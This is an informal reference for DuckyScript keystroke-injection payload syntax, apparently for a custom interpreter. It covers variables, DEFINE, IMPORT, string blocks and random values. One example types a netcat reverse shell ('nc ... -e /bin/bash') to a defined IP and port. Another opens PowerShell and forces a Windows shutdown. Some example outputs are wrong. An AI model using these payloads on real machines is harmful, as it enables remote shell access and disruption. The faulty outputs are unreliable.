Get random value :
    $_RANDOM_MIN = 0 
    $_RANDOM_MAX = 10 
    VAR $rng = $_RANDOM_INT 
    REM $rng will be be random value from 0 to 10 
    REM default value of $_RANDOM_MIN = 0 , $_RANDOM_MAX = 65535

IF, ELSE, END_IF is also used in ducky script 
250 Line duckfy.py

in code to define a var  : 
    $var = 5 or $var = "nice"

to define a const var :
    DEFINE VARIABLE NAME VALUE
example of DEFINE :
    DEFINE @IP 192.168.5.1
    DEFINE @PORT 53 

    REM netcat reverse shell example
    STRINGLN nc @IP @PORT -e /bin/bash &
output :
    nc @192.168.5.1 53 -e /bin/bash &
    <ENTER>
    


for one line comments :
    // THIS IS comment 
    // it will be passed 
    or :
    REM THIS IS comment 
    REM it will be passed 

for multiline comments you can use as follwing example:
    REM_BLOCK
    this is multiline comments
    nice how cool it s 
    usefull in case long comments msg instead restart every line with REM
    END_REM
    

    
for hold and relase button :
    HOLD ENTER
    DELAY 5000
    RELEASE ENTER
    REM "what will happen is that enter will be holded for 5 seconds untill release it"

for variable assignment:
    there is 2 ways to assign a variable:
        first way : $variable_name = "cool"
        second way : var $variable_name = "cool"
    and there is only one methode to reassign variable : 
        as example :
            var $data = "what is LOVE?"
            STRINGLN $data
            REM reassigning $data 
            $data = 404 
            STRINGLN $data 
        result :
            what is LOVE?
            400
there a also KEYWORD 'PRINT' which used to print a value to "Serial Console":
    example:
        PRINT "MSG TO SERIAL CONSOLE"
    result in Serial Console only:
        [SCRIPT]: "MSG TO SERIAL CONSOLE" 

INSANE KEYWORD THAT YOU WILL REALLY NEED IT IN FUTUR which is 'IMPORT':
    IMPORT : is used to import other ducky script in dir 
    example :
        {in same / dir we have 2 scripts. the main one: "payload.oqs" and second second one is "payload1.oqs" and we need to call payload1 from main patload} 
    REM payload.oqs 
    GUI r 
    DELAY 500
    STRING powershell
    SHIFT ENTER 
    DELAY 1000
    REM now we will import payload1.oqs
    IMPORT payload1.oqs 
    REM payload1.oqs is completed 
    STRINGLN echo "Have a good night =}"
    REM this command going to shutdown windows* in 1 second 
    STRINGLN shutdown -s -f -t 1 

for setting delay between each KEYSTROKE:
    use:
        REM delay should be in millisecond

        REM setting delay to be 100 ms between each keystroke 
        DEFAULT_DELAY 100 
        REM or 
        DEFAULTDELAY 100

Trick to reduce time and writing:
    Instead  of doing :
        STRING echo "hello world"
        ENTER
    you can do :
        STRINGLN echo "hello world"
        REM "STRINGLN is printing msg with \n which is like pressing ENTER"

    =======================================================
    Instead of doing :
        STRINGLN wow
        STRINGLN pizza
        STRINGLN give_it_a_shoot
    do:
        STRINGLN_BLOCK
        wowo
        pizza
        give_it_a_shoot
        END_STRINGLN
    or: 
        STRINGLN
        wowo
        pizza
        give_it_a_shoot
        END_STRINGLN
    ===================================================
    Instead of doing :
        STRING wow
        STRING pizza
        STRING give_it_a_shoot
    do:
        STRING_BLOCK
        echo "wowo and cool
        pizza
        give_it_a_shoot""
        END_STRING
    or :
        STRING
        echo "wowo and cool
        pizza
        give_it_a_shoot""
        END_STRING

    retult:
        echo "wowo and coolpizzagive_it_a_shoot"
there is REPEAT FUNC :
    STRINGLN "wow"
    REPEAT 5 
    REM it will repeat STRINGLN "wow" 5 times

RESTART_PAYLOAD will restart payload 
STOP_PAYLOAD will stop payload 

we also have in code support for random values :
   as example :
        RANDOM_NUMBER 5 

    result :
        random 5 number 

    and same thing for:

RANDOM_LOWERCASE_LETTER 4; abcd
RANDOM_UPPERCASE_LETTER 4 ; ABCD 
RANDOM_LETTER 4 ;AbCd 
RANDOM_NUMBER 4 ; 1234
RANDOM_SPECIAL 4 ; #@$%
RANDOM_CHAR 11 ; %^&ABcd1023

───────────────────────────────────────────────
RANDOM PLACEHOLDER USAGE EXAMPLES
───────────────────────────────────────────────

# Random 3-digit number (0–9)
$pin = $_RANDOM_NUMBER:3
STRINGLN "Generated PIN: $pin"
# Example output: Generated PIN: 573

# Random lowercase letters (a–z)
$key = $_RANDOM_LOWERCASE_LETTER:4
STRINGLN "Lowercase: $key"
# Example output: Lowercase: kqzm

# Random uppercase letters (A–Z)
$tag = $_RANDOM_UPPERCASE_LETTER:4
STRINGLN "Uppercase: $tag"
# Example output: Uppercase: TZMW

# Random mix of upper + lower letters (a–zA–Z)
$id = $_RANDOM_LETTER:4
STRINGLN "Mixed Letters: $id"
# Example output: Mixed Letters: aZkM

# Random special characters (!@#$%^...)
$sym = $_RANDOM_SPECIAL:3
STRINGLN "Specials: $sym"
# Example output: Specials: @$%

# Random characters (a–zA–Z0–9 + special)
$token = $_RANDOM_CHAR:5
STRINGLN "Secure Token: $token"
# Example output: Secure Token: A9!k@

        
internalVariables = {"$_CAPSLOCK_ON": _capsOn, "$_NUMLOCK_ON": _numOn, "$_SCROLLLOCK_ON": _scrollOn}
each one return status os button

cons : 
calling FUNCTION inside WHILE  loop will cause : <BS

i also .oqsed mouse jitter function :
JIGGLE_MOUSE 5000  // it will move mouse forward and backward for 5000 second by 1 pixle 
BACKGROUND_JIGGLE_MOUSE 5000 // it will run at the end of payload for 5000 without blocking your payload and you pass keyword INF to make it never end
